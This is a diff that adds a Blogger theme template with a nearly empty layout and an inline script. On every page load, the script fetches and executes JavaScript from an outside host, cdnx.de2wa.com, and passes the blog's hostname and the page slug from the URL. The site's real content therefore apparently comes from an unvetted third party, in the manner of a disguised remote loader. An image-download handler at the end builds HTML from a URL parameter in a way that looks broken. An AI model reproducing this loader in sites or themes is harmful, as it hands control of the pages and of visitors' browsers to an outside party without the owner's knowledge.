@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateUrl='indie.xml' b:templateVersion='1.3.0' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+    <head>
+
+    <meta charset='UTF-8'/>
+      <meta content='width=device-width, initial-scale=1' name='viewport'/>
+
+<title> <data:blog.pageTitle/> </title>
+
+        <b:skin><![CDATA[
+              
+            /* Custom CSS code goes here... */
+.BLOG_mobile_video_class{
+display:none
+}
+        ]]></b:skin>
+
+    </head>
+    <body>
+        <div id='blog-wrapper'>
+            <header>
+                <b:section class='header' id='header' maxwidgets='1' showaddelement='no'/>
+            </header>
+		</div>
+<div id='content-home'>
+           
+ </div>
+	    <b:if cond='data:blog.pageType == &quot;item&quot;'>
+<data:post.body/>
+</b:if>
+	    <footer/>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'/>
+      <script type='text/javascript'>
+
+function $_GET(param) {
+ var vars = {};
+ window.location.href.replace( location.hash, &#39;&#39; ).replace( 
+  /[?&amp;]+([^=&amp;]+)=?([^&amp;]*)?/gi, // regexp
+  function( m, key, value ) { // callback
+   vars[key] = value !== undefined ? value : &#39;&#39;;
+  }
+ );
+
+ if ( param ) {
+  return vars[param] ? vars[param] : null; 
+ }
+ return vars;
+}
+var home_url =window.location.protocol + &#39;//&#39; + window.location.hostname;
+//document.write(home_url);
+var slug = $_GET(&#39;t&#39;);
+if(slug == null){
+$.ajax({
+  type: &quot;GET&quot;,
+  url: &quot;//cdnx.de2wa.com/asset/blog.js.php?theme=sub_opat.srz&amp;f=pioneer_deh&amp;u=&quot; + home_url,
+  dataType: &quot;script&quot;
+});
+} 
+
+if(slug !== null &amp;&amp; slug !== &#39;&#39;) {
+var slug = $_GET(&#39;t&#39;);
+var slug1 = slug.replace(&quot;.html&quot;,&quot;&quot;);
+var slug2 = slug1.replace(&quot;/?&quot;,&quot;&quot;);
+//document.write(slug);
+
+$.ajax({
+  type: &quot;GET&quot;,
+  url: &quot;//cdnx.de2wa.com/asset/blog.js.php?theme=sub_opat.srz&amp;f=pioneer_deh&amp;slug=&quot; + slug2 + &quot;&amp;u=&quot;+ home_url ,
+  dataType: &quot;script&quot;
+});
+}
+
+var gambar = $_GET(&#39;img&#39;);
+//document.write(gambar);
+
+if(gambar !== null) {
+document.getElementById(&quot;blog-wrapper&quot;).innerHTML = &quot;<div class='col-md-12 text-center'><p><a class='btn btn-outline-primary' download='image' href='&apos;+ gambar +&apos;'>Download Image</a></p><p><img alt='' class='img-fluid' src='&apos;+ gambar +&apos;'/></p></div>&quot;;
+
+}
+</script></body></html>
